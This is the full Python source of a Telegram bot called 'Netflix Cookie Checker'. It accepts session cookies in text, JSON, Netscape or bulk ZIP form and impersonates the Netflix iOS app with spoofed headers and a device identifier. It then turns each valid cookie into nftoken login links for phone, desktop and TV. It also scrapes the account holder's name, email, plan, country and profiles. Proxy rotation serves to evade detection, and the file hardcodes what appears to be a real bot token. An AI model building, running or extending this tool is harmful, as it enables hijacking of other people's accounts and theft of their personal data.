import asyncio
import codecs
import html
import io
import json
import logging
import os
import re
import sys
import time
from threading import Thread
from typing import Dict, Optional, Tuple, Set
import zipfile

from flask import Flask
import requests
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ========== DIRECT CONFIGURATION ==========
BOT_TOKEN = "8915335839:AAGRpBFdulQwjjsaKvhZ-aiEUtY7VQdjV3o"  # Paste your Bot Token here
ADMIN_IDS = [6420446828]  # Primary Admin Telegram User IDs
PORT = int(os.environ.get("PORT", 10000))

# ========== FORCE JOIN CONFIGURATION ==========
# Set your channel username (e.g., "@XeronLab") or invite link. Set to None to disable.
REQUIRED_CHANNEL = "@XeronLab" 

# Memory sets for active tasks, cancellations, and approved users
ACTIVE_TASKS: Dict[int, asyncio.Task] = {}
CANCEL_REQUESTS: Set[int] = set()
APPROVED_USERS: Set[int] = set(ADMIN_IDS)  # Admins are approved by default

# ========== PROXY CONFIGURATION ==========
ACTIVE_PROXY = os.environ.get("PROXY_URL", None)


def get_proxies() -> Optional[Dict[str, str]]:
    if ACTIVE_PROXY:
        return {"http": ACTIVE_PROXY, "https": ACTIVE_PROXY}
    return None


# ========== LOGGING ==========
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

app_flask = Flask(__name__)
application = None

START_TEXT = (
    "👋 **Netflix Cookie Checker Bot**\n\n"
    "Send cookies as text or upload files!\n\n"
    "**Supported Inputs:**\n"
    "• Direct text message\n"
    "• `.txt` or `.json` file\n"
    "• `.zip` archive containing multiple cookie files\n\n"
    "**Commands:**\n"
    "• /addproxy - Add/Test a proxy (`user:pass:host:port` or `host:port`)\n"
    "• /delproxy - Remove active proxy\n"
    "• /proxy - Check current active proxy\n"
    "• /stop - Instantly stop an ongoing cookie check process\n\n"
    "⚡ Bot by @zyokr⚡"
)

HELP_TEXT = (
    "How it works:\n"
    "• Join our required channel and ask an admin for access.\n"
    "• Paste raw cookies as text OR upload a .txt/.json/.zip file.\n"
    "• Bot parses and validates cookies using Netflix API.\n"
    "• Send /stop at any time to instantly cancel a bulk process.\n\n"
    "⚡ Bot by @zyokr⚡"
)


# ========== PERMISSION & FORCE JOIN CHECKS ==========
async def check_user_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    
    # 1. Admin bypass
    if user_id in ADMIN_IDS:
        return True

    # 2. Check Force Join Channel
    if REQUIRED_CHANNEL:
        try:
            member = await context.bot.get_chat_member(REQUIRED_CHANNEL, user_id)
            if member.status not in ("member", "administrator", "creator"):
                channel_link = REQUIRED_CHANNEL.replace("@", "https://t.me/")
                await update.message.reply_text(
                    f"⚠️ **Access Denied!**\n\n"
                    f"You must join our official channel to use this bot:\n"
                    f"👉 [Join Channel]({channel_link})\n\n"
                    f"After joining, send /start again.",
                    parse_mode="Markdown",
                    disable_web_page_preview=True
                )
                return False
        except Exception as e:
            logger.warning(f"Force join check error for {user_id}: {e}")

    # 3. Check Approval Access
    if user_id not in APPROVED_USERS:
        await update.message.reply_text(
            f"🔒 **Access Restricted!**\n\n"
            f"Your Telegram ID (`{user_id}`) is not approved yet.\n"
            f"Contact an admin to approve your access.",
            parse_mode="Markdown"
        )
        return False

    return True


# Helper Parsers & Cookie Extractors
def _is_json_cookie(text: str) -> bool:
    text = text.strip()
    if not (text.startswith("[") and text.endswith("]")):
        return False
    try:
        json.loads(text)
        return True
    except:
        return False


def _is_netscape_cookie(text: str) -> bool:
    lines = text.strip().split("\n")
    if len(lines) < 1:
        return False
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "\t" in line:
            parts = line.split("\t")
            if len(parts) >= 7:
                return True
        else:
            parts = line.split()
            if len(parts) >= 7:
                domain, flag, path, secure = parts[0], parts[1], parts[2], parts[3]
                try:
                    expiration = int(parts[4])
                    if (domain.startswith(".") and flag in ["TRUE", "FALSE"] and path == "/" and secure in ["TRUE", "FALSE"]):
                        return True
                except (ValueError, IndexError):
                    continue
    return False


def _looks_like_cookie_header(text: str) -> bool:
    t = text.strip().lower()
    return t.startswith("cookie:") or (";" in text and "=" in text)


def _extract_json_cookies(json_str: str) -> Dict[str, str]:
    try:
        cookies_array = json.loads(json_str)
        kv: Dict[str, str] = {}
        if isinstance(cookies_array, list):
            for cookie_obj in cookies_array:
                if isinstance(cookie_obj, dict):
                    name, value = cookie_obj.get("name", ""), cookie_obj.get("value", "")
                    if name and value:
                        kv[name] = value
        return kv
    except Exception:
        return {}


def _extract_netscape_cookies(netscape_str: str) -> Dict[str, str]:
    kv: Dict[str, str] = {}
    for line in netscape_str.strip().split("\n"):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        delimiter = "\t" if "\t" in line else " "
        parts = line.split(delimiter) if delimiter == "\t" else line.split()
        if len(parts) >= 7:
            try:
                if delimiter == "\t":
                    name, value = parts[5], parts[6]
                else:
                    try:
                        int(parts[4])
                    except ValueError:
                        continue
                    name = parts[5]
                    match = re.match(r"^(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.+)$", line)
                    value = match.group(7).strip() if match else " ".join(parts[6:])
                if name and value:
                    kv[name] = value
            except (ValueError, IndexError):
                continue
    return kv


def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
    cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", text).strip()
    parts = [p.strip() for p in cleaned.split(";") if p.strip()]
    if len(parts) == 1 and "\n" in cleaned:
        parts = [p.strip() for p in cleaned.splitlines() if p.strip()]
    kv: Dict[str, str] = {}
    for part in parts:
        m = re.match(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", part, re.DOTALL)
        if m:
            kv[m.group(1).strip()] = m.group(2).strip()
    return kv


def _build_cookie_header(cookie_input: str) -> Optional[str]:
    if _is_json_cookie(cookie_input):
        kv = _extract_json_cookies(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
    if _is_netscape_cookie(cookie_input):
        kv = _extract_netscape_cookies(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
    if _looks_like_cookie_header(cookie_input):
        cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()
        if "=" not in cleaned:
            return None
        kv = _extract_cookie_kv_pairs(cookie_input)
        if kv:
            return "; ".join([f"{k}={v}" for k, v in kv.items()])
        return cleaned
    kv = _extract_cookie_kv_pairs(cookie_input)
    if kv:
        return "; ".join([f"{k}={v}" for k, v in kv.items()])
    return None


def _safe_preview_cookie_keys(cookie_header: str) -> str:
    names = [token.split("=", 1)[0].strip() for token in cookie_header.split(";") if "=" in token]
    return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")


def parse_proxy_string(proxy_raw: str) -> Optional[str]:
    parts = proxy_raw.strip().split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            host, port, user, password = parts[0], parts[1], parts[2], parts[3]
        else:
            user, password, host, port = parts[0], parts[1], parts[2], parts[3]
        return f"http://{user}:{password}@{host}:{port}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif proxy_raw.startswith(("http://", "https://", "socks5://")):
        return proxy_raw
    return None


def test_proxy_connection(proxy_url: str) -> Tuple[bool, str]:
    proxies = {"http": proxy_url, "https": proxy_url}
    try:
        r = requests.get("https://www.netflix.com", proxies=proxies, timeout=10, verify=False)
        if r.status_code in [200, 301, 302, 403]:
            return True, f"HTTP {r.status_code}"
        return False, f"Unexpected response (HTTP {r.status_code})"
    except Exception as e:
        return False, str(e)


# Netflix API Logic
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}


def _extract_netflix_id(cookie_header: str) -> Optional[str]:
    for token in cookie_header.split(";"):
        token = token.strip()
        if token and "=" in token:
            k, v = token.split("=", 1)
            if k.strip().lower() == "netflixid":
                return v.strip()
    return None


def _generate_nftoken(cookie_header: str, timeout_s: int = 15) -> Tuple[bool, str, Optional[str]]:
    netflix_id = _extract_netflix_id(cookie_header)
    if not netflix_id:
        return False, "Invalid cookie. NetflixId not found.", None
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        r = requests.get(
            NFTOKEN_API_URL,
            params=NFTOKEN_QUERY_PARAMS,
            headers=headers,
            timeout=timeout_s,
            verify=False,
            proxies=get_proxies(),
        )
        r.raise_for_status()
        data = r.json()
        nftoken = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}).get("token")
        if not nftoken:
            return False, "Expired cookie. Token generation failed.", None
        return True, "Token generated.", nftoken
    except Exception:
        return False, "Invalid or expired cookie.", None


def decode_text(value):
    if value is None:
        return "Unknown"
    value = str(value)
    try:
        value = codecs.decode(value, "unicode_escape")
    except Exception:
        pass
    value = html.unescape(value)
    return re.sub(
        r"\\x([0-9A-Fa-f]{2})",
        lambda m: bytes.fromhex(m.group(1)).decode("latin1"),
        value,
    ).strip()


def _check_netflix_cookie(cookie_header: str, timeout_s: int = 15) -> Dict[str, str]:
    cookie_dict = {}
    for token in cookie_header.split(";"):
        token = token.strip()
        if token and "=" in token:
            k, v = token.split("=", 1)
            cookie_dict[k.strip()] = v.strip()
    if not cookie_dict.get("NetflixId"):
        return {"ok": False, "reason": "No NetflixId found"}

    session = requests.Session()
    if ACTIVE_PROXY:
        session.proxies.update(get_proxies())
    session.cookies.update(cookie_dict)
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            " (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
    }
    urls = ["https://www.netflix.com/YourAccount", "https://www.netflix.com/account"]
    try:
        resp, txt = None, ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=timeout_s, allow_redirects=True, verify=False)
                if r.status_code == 200 and "Account" in (r.text or ""):
                    resp, txt = r, r.text or ""
                    break
            except Exception:
                continue
        if not resp or resp.status_code != 200:
            return {"ok": False, "reason": f"HTTP {resp.status_code if resp else 'error'}"}

        def find(p):
            m = re.search(p, txt)
            return decode_text(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        country = (
            find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
            or find(r'"countryCode"\s*:\s*"([^"]+)"')
            or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        )
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"')

        profiles = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=10, verify=False)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "") or re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text or "")
        except Exception:
            pass

        return {
            "ok": True,
            "name": name or "Unknown",
            "country": country or "Unknown",
            "plan": plan or "Unknown",
            "email": email or "Unknown",
            "profiles": ", ".join(decode_text(p) for p in profiles) if profiles else "Unknown",
        }
    except Exception as e:
        return {"ok": False, "reason": str(e)}


async def process_and_reply_cookie(update: Update, cookie_input: str, file_name: str = "") -> bool:
    user_id = update.effective_user.id
    if user_id in CANCEL_REQUESTS:
        return False

    cookie_header = _build_cookie_header(cookie_input)
    if not cookie_header:
        if file_name:
            await update.message.reply_text(f"❌ Failed to parse cookies from `{file_name}`\n\n⚡ Bot by @zyokr⚡", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Could not parse cookies from provided text.\n\n⚡ Bot by @zyokr⚡")
        return True

    preview = _safe_preview_cookie_keys(cookie_header)
    prefix = f"📄 **File:** `{file_name}`\n" if file_name else ""
    msg = await update.message.reply_text(
        f"{prefix}🔎 Checking Netflix cookies...\n(Detected keys: {preview})",
        parse_mode="Markdown",
    )

    if user_id in CANCEL_REQUESTS:
        await msg.edit_text("⏹️ Check cancelled.\n\n⚡ **Bot by @zyokr⚡**", parse_mode="Markdown")
        return False

    loop = asyncio.get_running_loop()
    ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)

    if user_id in CANCEL_REQUESTS:
        await msg.edit_text("⏹️ Check cancelled.\n\n⚡ **Bot by @zyokr⚡**", parse_mode="Markdown")
        return False

    if ok and nftoken:
        acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
        phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
        desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"
        tv_link = f"https://www.netflix.com/tv8?nftoken={nftoken}"

        acct_html = ""
        if acct and acct.get("ok"):
            acct_html = (
                "<b>Account details</b>:\n"
                f"• Name: {html.escape(str(acct.get('name','Unknown')))}\n"
                f"• Plan: {html.escape(str(acct.get('plan','Unknown')))}\n"
                f"• Country: {html.escape(str(acct.get('country','Unknown')))}\n"
                f"• Email: {html.escape(str(acct.get('email','Unknown')))}\n"
                f"• Profiles: {html.escape(str(acct.get('profiles','Unknown')))}\n"
            )

        title = f"📄 <b>File:</b> <code>{html.escape(file_name)}</code>\n" if file_name else ""
        await msg.edit_text(
            f"{title}✅ <b>Valid cookie detected.</b>\n\n"
            "<b>Session login links:</b>\n"
            f'📱 Phone: <a href="{phone_link}">Open link</a>\n'
            f'🖥️ Desktop: <a href="{desktop_link}">Open link</a>\n'
            f'📺 TV: <a href="{tv_link}">Open link</a>\n\n'
            f"{acct_html}\n"
            "⚡ <b>Bot by @zyokr⚡</b>",
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    else:
        title = f"📄 **File:** `{file_name}`\n" if file_name else ""
        await msg.edit_text(f"{title}❌ {detail}\n\n⚡ **Bot by @zyokr⚡**", parse_mode="Markdown")

    return True


# ========== BOT COMMANDS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_user_access(update, context):
        await update.message.reply_text(START_TEXT, parse_mode="Markdown")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await check_user_access(update, context):
        await update.message.reply_text(HELP_TEXT)


# ADMIN APPROVAL COMMANDS
async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin access required.")
        return

    if not context.args:
        await update.message.reply_text("📌 **Usage:** `/approve <telegram_user_id>`", parse_mode="Markdown")
        return

    try:
        target_id = int(context.args[0])
        APPROVED_USERS.add(target_id)
        await update.message.reply_text(
            f"✅ User `{target_id}` has been **approved** to use the bot!\n\n⚡ **Bot by @zyokr⚡**",
            parse_mode="Markdown"
        )
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text="🎉 **Your access has been approved!** Send /start to start checking cookies.",
                parse_mode="Markdown"
            )
        except Exception:
            pass
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid numeric User ID.")


async def disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin access required.")
        return

    if not context.args:
        await update.message.reply_text("📌 **Usage:** `/disapprove <telegram_user_id>`", parse_mode="Markdown")
        return

    try:
        target_id = int(context.args[0])
        if target_id in APPROVED_USERS:
            APPROVED_USERS.remove(target_id)
            await update.message.reply_text(f"🗑️ User `{target_id}` access revoked.", parse_mode="Markdown")
        else:
            await update.message.reply_text(f"ℹ️ User `{target_id}` is not in the approved list.", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ Please provide a valid numeric User ID.")


async def list_approved_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin access required.")
        return

    users_str = "\n".join([f"• `{uid}`" for uid in APPROVED_USERS])
    await update.message.reply_text(f"👥 **Approved Users:**\n{users_str}", parse_mode="Markdown")


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    CANCEL_REQUESTS.add(user_id)

    if user_id in ACTIVE_TASKS:
        task = ACTIVE_TASKS[user_id]
        if not task.done():
            task.cancel()

    await update.message.reply_text(
        "🛑 **Stopped checking process immediately!**\n\n⚡ **Bot by @zyokr⚡**",
        parse_mode="Markdown",
    )


async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ACTIVE_PROXY
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin access required.")
        return
    if not context.args:
        await update.message.reply_text("📌 **Usage:** `/addproxy user:pass:host:port` or `/addproxy host:port`", parse_mode="Markdown")
        return
    parsed_proxy = parse_proxy_string(context.args[0])
    if not parsed_proxy:
        await update.message.reply_text("❌ **Invalid proxy format.** Use `user:pass:host:port` or `host:port`.")
        return
    msg = await update.message.reply_text("🔄 Checking proxy status...")
    loop = asyncio.get_running_loop()
    is_live, detail = await loop.run_in_executor(None, test_proxy_connection, parsed_proxy)
    if is_live:
        ACTIVE_PROXY = parsed_proxy
        await msg.edit_text("✅ **Proxy is LIVE!** Saved successfully.\n\n⚡ **Bot by @zyokr⚡**", parse_mode="Markdown")
    else:
        await msg.edit_text(f"❌ **Proxy check failed:** {detail}\nProxy was not saved.", parse_mode="Markdown")


async def delproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ACTIVE_PROXY
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin access required.")
        return
    ACTIVE_PROXY = None
    await update.message.reply_text("🗑️ **Proxy removed.** Reverted to direct connections.\n\n⚡ **Bot by @zyokr⚡**", parse_mode="Markdown")


async def check_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin access required.")
        return
    if ACTIVE_PROXY:
        masked = re.sub(r"://([^:]+):([^@]+)@", "://***:***@", ACTIVE_PROXY)
        await update.message.reply_text(f"🌐 **Active Proxy:** `{masked}`", parse_mode="Markdown")
    else:
        await update.message.reply_text("🌐 **No active proxy set.** (Using Direct Connection)")


async def handle_cookie_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    if not await check_user_access(update, context):
        return

    user_id = update.effective_user.id
    if user_id in CANCEL_REQUESTS:
        CANCEL_REQUESTS.remove(user_id)
    await process_and_reply_cookie(update, update.message.text.strip())


# Bulk zip worker running in isolated task
async def run_zip_bulk_check(update: Update, file_bytes: bytearray, file_name_str: str):
    user_id = update.effective_user.id
    status_msg = await update.message.reply_text(
        f"📦 Extracting and checking cookies from `{file_name_str}`...\nSend /stop to cancel anytime.",
        parse_mode="Markdown",
    )
    processed = 0
    was_cancelled = False

    try:
        with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
            for fname in zf.namelist():
                if user_id in CANCEL_REQUESTS:
                    was_cancelled = True
                    break

                if fname.lower().endswith((".txt", ".json")):
                    content = zf.read(fname).decode("utf-8", errors="ignore")
                    should_continue = await process_and_reply_cookie(update, content, file_name=fname)
                    if not should_continue or user_id in CANCEL_REQUESTS:
                        was_cancelled = True
                        break
                    processed += 1
                    await asyncio.sleep(0.5)

        if user_id in CANCEL_REQUESTS:
            CANCEL_REQUESTS.remove(user_id)

        if was_cancelled:
            await status_msg.edit_text(
                f"⏹️ Process stopped! Checked **{processed}** cookie file(s) before stopping.\n\n⚡ **Bot by @zyokr⚡**",
                parse_mode="Markdown",
            )
        else:
            await status_msg.edit_text(
                f"✅ Finished bulk check! Processed **{processed}** cookie file(s) from `{file_name_str}`.\n\n⚡ **Bot by @zyokr⚡**",
                parse_mode="Markdown",
            )
    except asyncio.CancelledError:
        await status_msg.edit_text(
            f"⏹️ Process cancelled immediately! Checked **{processed}** cookie file(s).\n\n⚡ **Bot by @zyokr⚡**",
            parse_mode="Markdown",
        )
    except Exception as e:
        await status_msg.edit_text(
            f"❌ Failed to extract ZIP archive: `{e}`\n\n⚡ **Bot by @zyokr⚡**",
            parse_mode="Markdown",
        )
    finally:
        ACTIVE_TASKS.pop(user_id, None)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document:
        return

    if not await check_user_access(update, context):
        return

    user_id = update.effective_user.id
    if user_id in CANCEL_REQUESTS:
        CANCEL_REQUESTS.remove(user_id)

    file_name = document.file_name.lower()
    file_obj = await context.bot.get_file(document.file_id)
    file_bytes = await file_obj.download_as_bytearray()

    if file_name.endswith((".txt", ".json")):
        content = file_bytes.decode("utf-8", errors="ignore")
        await process_and_reply_cookie(update, content, file_name=document.file_name)

    elif file_name.endswith(".zip"):
        task = asyncio.create_task(run_zip_bulk_check(update, file_bytes, document.file_name))
        ACTIVE_TASKS[user_id] = task

    else:
        await update.message.reply_text(
            "❌ Unsupported file type. Upload `.txt`, `.json`, or `.zip`.\n\n⚡ **Bot by @zyokr⚡**",
            parse_mode="Markdown",
        )


def run_bot_in_thread():
    global application
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        return
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # User Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("stop", stop_command))
    
    # Admin Commands
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("disapprove", disapprove_command))
    application.add_handler(CommandHandler("users", list_approved_users))
    application.add_handler(CommandHandler("addproxy", addproxy_command))
    application.add_handler(CommandHandler("delproxy", delproxy_command))
    application.add_handler(CommandHandler("proxy", check_proxy_command))
    
    # Text & Document Handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    loop.run_until_complete(
        application.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=())
    )


@app_flask.route("/", methods=["GET"])
def index():
    return "🟢 Netflix Cookie Checker Bot is Active", 200


@app_flask.route("/health", methods=["GET"])
def health():
    return {"status": "healthy" if application else "unhealthy"}, 200


if __name__ == "__main__":
    if BOT_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        bot_thread = Thread(target=run_bot_in_thread, daemon=False)
        bot_thread.start()
        time.sleep(3)

    app_flask.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False, threaded=True)